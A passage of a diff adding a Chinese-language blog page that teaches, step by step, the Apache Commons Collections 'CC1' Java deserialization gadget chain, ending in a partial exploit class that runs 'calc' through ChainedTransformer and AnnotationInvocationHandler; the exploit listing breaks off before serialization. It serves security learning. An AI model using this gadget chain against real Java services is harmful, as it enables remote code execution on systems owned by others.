@@ -1,0 +1,513 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CommonCollections1 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CommonCollections1前言Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 Apache Commons Collections 中提供了一个 Transformer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonCollections1">
+<meta property="og:url" content="http://example.com/2023/04/04/CommonCollections1/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="CommonCollections1前言Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 Apache Commons Collections 中提供了一个 Transformer">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png">
+<meta property="article:published_time" content="2023-04-04T07:10:57.000Z">
+<meta property="article:modified_time" content="2023-04-05T07:57:38.247Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/04/04/CommonCollections1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CommonCollections1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-05 15:57:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/202304051554165.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CommonCollections1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-04T07:10:57.000Z" title="发表于 2023-04-04 15:10:57">2023-04-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-05T07:57:38.247Z" title="更新于 2023-04-05 15:57:38">2023-04-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CommonCollections1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
+<p>Apache Commons Collections 中提供了一个 Transformer 的类，这个接口的功能就是将一个对象转换为另外一个对象，CC 链都依赖于此</p>
+<p>下面的是跟着大佬的脚步，一步一步分析，从零开始一层一层往上找链子</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>然后下载sun包，点击zip</p>
+<p><a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
+<p>下载后解压，把 jdk-af660750b2f4&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun 放到jdk中src⽂件夹中，默认有个src.zip 需要先</p>
+<p>解压</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554777.png" alt="image-20230405101946093"></p>
+<p>把src⽂件加载进来</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554932.png" alt="image-20230405102033235"></p>
+<p>创建一个Maven项目，不用选择任何Maven模板；<br>在pom.xml中添加如下代码：</p>
+<pre><code class="xml">&lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<p>pom.xml:</p>
+<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+  &lt;groupId&gt;org.example&lt;/groupId&gt;
+  &lt;artifactId&gt;CC1&lt;/artifactId&gt;
+  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+  &lt;packaging&gt;jar&lt;/packaging&gt;
+
+  &lt;name&gt;CC1&lt;/name&gt;
+  &lt;url&gt;http://maven.apache.org&lt;/url&gt;
+
+  &lt;properties&gt;
+    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+  &lt;/properties&gt;
+
+  &lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+      &lt;version&gt;3.1&lt;/version&gt;
+    &lt;/dependency&gt;
+  &lt;/dependencies&gt;
+&lt;/project&gt;
+</code></pre>
+<h2 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h2><p>找这条链子的最终目的是为了执行任意命令，比如说弹个计算器<code>calc</code></p>
+<p>最简单的方法是</p>
+<pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);
+</code></pre>
+<p>通过反射方式实现：</p>
+<pre><code class="java">Runtime r = Runtime.getRuntime();
+Class c =Runtime.class;
+Method execMethod  = c.getMethod(&quot;exec&quot;,String.class);
+execMethod.invoke(r,&quot;calc&quot;);
+</code></pre>
+<p>这里，我们不能够简单的实现这样的功能，而是找到一条链子，通过一层层的调用来执行命令</p>
+<p>首先，要找到漏洞点</p>
+<p>在<code>Apache Commons Collections</code>库中，里面有一个Transformer.java ,里面就这点东西</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554657.png" alt="image-20230404173415777"></p>
+<p>这段代码定义了一个接口叫做 Transformer，它是一种用于类型转换或者提取数据的函数接口。该接口中只有一个单独的方法 transform(Object input) ，用于将输入对象转换成输出对象，而不改变输入对象本身。</p>
+<p>查看一下实现Transformer的方法，总共有14个，漏洞点在<code>InvokerTransformer</code>里</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555827.png" alt="image-20230404174817485"></p>
+<p>跟进InvokerTransformer.java里，查看它的transform方法：</p>
+<pre><code class="java">public Object transform(Object input) &#123;
+        if (input == null) &#123;
+            return null;
+        &#125;
+        try &#123;
+            Class cls = input.getClass();
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+            return method.invoke(input, iArgs);
+                
+        &#125; catch (NoSuchMethodException ex) &#123;
+            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
+        &#125; catch (IllegalAccessException ex) &#123;
+            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
+        &#125; catch (InvocationTargetException ex) &#123;
+            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);
+        &#125;
+    &#125;
+</code></pre>
+<p>首先，该方法会判断输入对象是否为空，如果为空则直接返回 null。</p>
+<p>如果输入对象不为空，则会获取其所属的类，并根据传入的方法名以及参数类型，反射获取该方法的 Method 对象。接下来，通过 method.invoke() 方法，对原输入对象调用该方法并传入参数，得到转换后的结果对象，并将其返回。</p>
+<p>在这里我们可以看到刚刚反射执行<code>calc</code>的影子，并且<code>iMethodName (方法名)</code>，<code>iParamTypes (参数类型) </code>，<code>iArgs (参数)</code>都是可控的，可以实现任意方法调用</p>
+<p>往上寻找它的构造函数：</p>
+<pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
+        super();
+        iMethodName = methodName;
+        iParamTypes = paramTypes;
+        iArgs = args;
+    &#125;
+</code></pre>
+<p>可以尝试用这个方法弹个计算器</p>
+<pre><code class="java"> Runtime r = Runtime.getRuntime();
+ new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;).transform(r);
+</code></pre>
+<p>成功执行！</p>
+<img src="https://raw.githubusercontent.com/todis21/image/main/202304051555629.png" alt="image-20230404190713998" style="zoom:50%;" />
+
+
+
+<p>现在相当于获取了链子的末端[危险方法：transform]，看看有哪些类调用了transform，这样我们才能往上走，Alt+F7</p>
+<p>可以看到有19个调用，经过一番查找，找到TransformedMap</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555610.png" alt="image-20230404192653822"></p>
+<pre><code class="java">protected Object checkSetValue(Object value) &#123;
+     return valueTransformer.transform(value);
+ &#125;
+</code></pre>
+<p><code>valueTransformer</code>是构造函数传来的，<code>value</code>还不能确定能不能控制</p>
+<p>查看<code>TransformedMap</code>的构造函数：</p>
+<pre><code class="java">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
+   super(map);
+   this.keyTransformer = keyTransformer;
+   this.valueTransformer = valueTransformer;
+&#125;
+</code></pre>
+<p>该方法继承自 Map 接口的实现类，用于对 Map 中的 key 和 value 进行转换操作。其中，构造方法接收一个 Map 对象 map，以及两个 Transformer 对象 keyTransformer 和 valueTransformer，分别用于对 Map 中的 key 和 value 进行转换</p>
+<p>因为这个构造函数是<code>protected</code>类型的，只能在类内部和子类中访问，看看哪个方法调用了它</p>
+<p>直接往上一个方法就看到了,这里直接完成了上一个函数的操作，并且是<code>public static</code></p>
+<pre><code class="java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
+      return new TransformedMap(map, keyTransformer, valueTransformer);
+ &#125;
+</code></pre>
+<p>到这里，我们是可以直接调用<code>decorate</code>方法，但是还没找到让程序执行到<code>checkSetValue</code> 的方式</p>
+<p>查看一下有哪些方法调用了<code>checkSetValue</code>,直接Alt+F7</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555228.png" alt="image-20230404200924860"></p>
+<p>找到了，并且只有一个，在<code>AbstractInputCheckedMapDecorator.java</code>中,如下</p>
+<pre><code class="java">static class MapEntry extends AbstractMapEntryDecorator &#123;
+
+        /** The parent map */
+        private final AbstractInputCheckedMapDecorator parent;
+
+        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;
+            super(entry);
+            this.parent = parent;
+        &#125;
+
+        public Object setValue(Object value) &#123;
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        &#125;
+    &#125;
+</code></pre>
+<p>并且发现<code>AbstractInputCheckedMapDecorator</code>是TransformedMap的父类</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555347.png" alt="image-20230404201443638"></p>
+<p>再看看有哪些地方调用了<code>setValue</code>方法，Alt+F7，发现有好多</p>
+<p>经过大佬讲解，这个<code>MapEntry</code>名字已经给出了提示，大概就是遍历map的键值对时就会调用这个方法，这里的setValue()其实是被重写了的entry.setValue()</p>
+<pre><code class="java">for(Map.Entry entry:Map.entrySet()) //遍历map
+&#123;
+    entry.getValue();
+&#125;   
+</code></pre>
+<p>到这里应该通透了，可以试试用这个来弹计算器</p>
+<pre><code class="java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);
+HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();
+map.put(&quot;key&quot;,&quot;value&quot;);
+Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);
+for(Map.Entry entry:transformedMap.entrySet())
+  &#123;
+    entry.setValue(r);
+  &#125;
+</code></pre>
+<p>OK,没猫病</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555088.png" alt="image-20230404203335268"></p>
+<p>到现在已经找到后半条链了，现在要找到一个遍历Map的地方，并且使用了setValue()，就可以执行后面的链子了</p>
+<p>继续找调用了setValue()的不同类，最好找到满足条件并且在readObject方法下的， 通过Alt+F7直接找到setValue()</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555770.png" alt="image-20230405102345558"></p>
+<p>在sun.reflect.annotation下发现了readObject⽅法，点进去查看，发现刚好满足条件，遍历集合，重写了readObject(),并且调用了setValue(),</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555873.png" alt="image-20230405102543904"></p>
+<p>查看一下这个类的构造函数</p>
+<p>构造⽅法传⼊两个参数，第⼀个是注解，第⼆个是map集合这个我们可以控制</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555799.png" alt="image-20230405103639780"></p>
+<p>该类使⽤了class修饰 所以访问需要当前包下，这⾥需要使⽤反射加载才能调⽤这个构造⽅法</p>
+<p>目前流程大概是这样子的：</p>
+<pre><code class="java">Runtime r = Runtime.getRuntime();
+InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);
+HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();
+map.put(&quot;key&quot;,&quot;value&quot;);
+Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);
+
+Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
+annotationInvocationHandlConstructor.setAccessible(true);
+serialize(o);
+unserialize(&quot;ser.bin&quot;);
+</code></pre>
+<p>serialize和unserialize如下：</p>
+<pre><code class="java">public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    &#125;
+</code></pre>
+<p>⼤致是这样的，但是⽆法运⾏，因为序列化必须继承Serializable接⼝，Runtime ⽆法序列化，并且setValue的值⽆法控制</p>
+<p>还有就是遍历map中需要绕过两个if判断</p>
+<p>问题多多，需要一个个解决</p>
+<p>先解决Runtime问题</p>
+<p>虽然Runtime⽆法序列化，但是<code>Runtime.class</code>是可以序列化的</p>
+<pre><code class="java">Class c = Runtime.class;
+Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);
+Runtime r = (Runtime) getRuntime.invoke(null, null);
+Method exec = c.getMethod(&quot;exec&quot;, String.class);
+exec.invoke(r,&quot;calc&quot;);
+</code></pre>
+<pre><code class="java">//将上面的代码转换一下
+
+
+Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);
+
+Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);
+
+new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);
+</code></pre>
+<p>这里可以发现，前一段的代码的输出，是后一段代码的输入，递归调用</p>
+<p>有一个方法可以实现它</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556062.png" alt="image-20230405112001531"></p>
+<p>只要传入要调用的方法的数组就行</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+   new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+   new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+   new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+chainedTransformer.transform(Runtime.class);
+</code></pre>
+<p>正常执行</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556399.png" alt="image-20230405112757891"></p>
+<p>这里修改过后，后面的也需要更改</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+     new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+     new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+     new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//chainedTransformer.transform(Runtime.class);
+
+
+//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);
+HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();
+map.put(&quot;key&quot;,&quot;value&quot;);
+Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);
+
+Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
+annotationInvocationHandlConstructor.setAccessible(true);
+Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);
+serialize(o);
+unserialize(&quot;ser.bin&quot;);
+</code></pre>
+<p>现在还不能正常运行，还需要解决两个判断条件：</p>
+<p>经过调试，发现已经进入两个判断了</p>
+<p>！这咋和教程里的不一样，大佬调试的还没进判断里，我的就进去了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556765.png" alt="image-20230405115955396"></p>
+<p>可能是我的jdk版本问题，我的是jdk 8u361，建议用下面的</p>
+<p>环境jdk 8u65</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<p>用大佬的图，继续</p>
+<p>在上面的代码可以看出两个if 分别是检测key中的value是否为空，第⼆个if是判断参数是否强转</p>
+<p>这⾥打个断点调试下</p>
+<p>看到这⾥的memberType是传⼊的注解 Override，成员变量为空</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556123.png" alt="image-20230405151509078"></p>
+<p>这⾥的memberValue是map中的Override，通过这个Override寻找这个value，下⼀步后，直接跳出判断，</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556077.png" alt="image-20230405151707774"></p>
+<p>Override是单独的接⼝，没有成员⽅法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556475.png" alt="image-20230405151819169"></p>
+<p>这⾥换成其他注解 Target</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556370.png" alt="image-20230405151852079"></p>
+<pre><code class="java">修改前：Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);
+修改后：Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);
+</code></pre>
+<p>替换后重新断点,发现找到了参数</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556732.png" alt="image-20230405152131419"></p>
+<p>这⾥第⼆个if也成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556195.png" alt="image-20230405153735429"></p>
+<p>还有一个问题，就是参数控制setValue的参数控制</p>
+<p>点击setValue 进来，跳转到transformmap中的checkSetValue⽅法，value为固定的，⽆法控制执⾏任意类</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556466.png" alt="image-20230405154030512"></p>
+<p>在⼀开始查找transform时，会有⼀个ClosureTransformer类，这⾥的transform传递的参数不论是什么，都会返回⼀个常量，因此通过这个进⾏覆盖。</p>
+<p>原本调⽤valueTransformer.transform(Object)，中途在换 ClosureTransformer.transform(Object) 只要最终调⽤到transform(Object)就可以执⾏任意类</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556411.png" alt="image-20230405154346613"></p>
+<p>在数组中添加⼀下代码，把value替换为Runtime.class即可执⾏命令</p>
+<pre><code>new ConstantTransformer(Runtime.class)
+</code></pre>
+<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>这就是最终的调⽤链,在最终调⽤transform的时候，⽤的是不同类的同名函数</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051557054.png" alt="image-20230405154532332"></p>
+<p>exp:</p>
+<pre><code class="java">package org.example;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class demo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        //代码执行
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,
+                        Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,
+                        Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]
+                        &#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        //遍历map
+        HashMap&lt;Object,Object&gt; map = new HashMap();
+        map.put(&quot;value&quot;,&quot;aaa&quot;);
+        Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);
